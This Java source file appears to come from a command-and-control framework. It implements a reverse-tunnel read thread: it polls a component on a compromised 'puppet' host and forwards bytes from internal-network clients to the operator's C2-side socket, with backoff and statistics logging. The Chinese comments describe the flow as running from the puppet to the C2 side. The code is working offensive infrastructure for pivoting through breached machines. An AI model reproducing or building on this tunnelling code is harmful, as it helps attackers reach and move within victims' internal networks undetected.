package org.leo.core.engine.reverse;

import org.leo.core.engine.socks5.Socks5ProxyStatistics;
import org.leo.core.puppet.impl.JavaPuppetNode;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.net.Socket;
import java.util.HashMap;
import java.util.Map;

/**
 * 从 puppet 端读数据 → 写到 C2 本地 socket（forwardHost:forwardPort）。
 * 即"傀儡 accept 到的内网客户端发来的字节"流向"C2 侧目标服务"。
 */
class ReverseReadThread implements Runnable {

    private static final Logger logger = LoggerFactory.getLogger(ReverseReadThread.class);

    private final ReverseTunnelServer server;
    private final Socket localSocket;
    private final String connId;

    ReverseReadThread(ReverseTunnelServer server, Socket localSocket, String connId) {
        this.server = server;
        this.localSocket = localSocket;
        this.connId = connId;
    }

    public void run() {
        JavaPuppetNode puppet = server.getJavaPuppetNode();
        Socks5ProxyStatistics stats = server.getStatistics();
        long idleDelay = 50L;
        while (server.isRunning()) {
            if (localSocket == null || localSocket.isClosed()) return;
            try {
                Map<String, Object> params = new HashMap<String, Object>();
                params.put("op", Integer.valueOf(ReverseTunnelServer.OP_READ));
                params.put("connId", connId);
                Map<String, Object> res = puppet.invokeComponent("ReverseTunnelComponent", params);
                Object code = res != null ? res.get("code") : null;
                if (Integer.valueOf(200).equals(code)) {
                    byte[] data = (byte[]) res.get("data");
                    if (data != null && data.length > 0) {
                        localSocket.getOutputStream().write(data);
                        localSocket.getOutputStream().flush();
                        if (stats != null) stats.addUploadBytes(connId, data.length);
                    }
                    idleDelay = 50L; // 有数据，重置退避
                    continue;
                }
                if (Integer.valueOf(204).equals(code)) {
                    // 无数据：指数退避，上限 800ms
                    Thread.sleep(idleDelay);
                    if (idleDelay < 800L) idleDelay = Math.min(idleDelay * 2, 800L);
                    continue;
                }
                if (Integer.valueOf(404).equals(code)) {
                    logger.debug("反向隧道 puppet 侧连接关闭: connId={}", connId);
                    try { localSocket.close(); } catch (Exception ignored) {}
                    break;
                }
                if (Integer.valueOf(500).equals(code)) {
                    logger.debug("反向隧道读异常: {}", res.get("msg"));
                    break;
                }
            } catch (Exception e) {
                if (server.isRunning()) {
                    logger.debug("反向隧道读循环异常: connId={} {}", connId, e.getMessage());
                }
                return;
            }
        }
    }
}
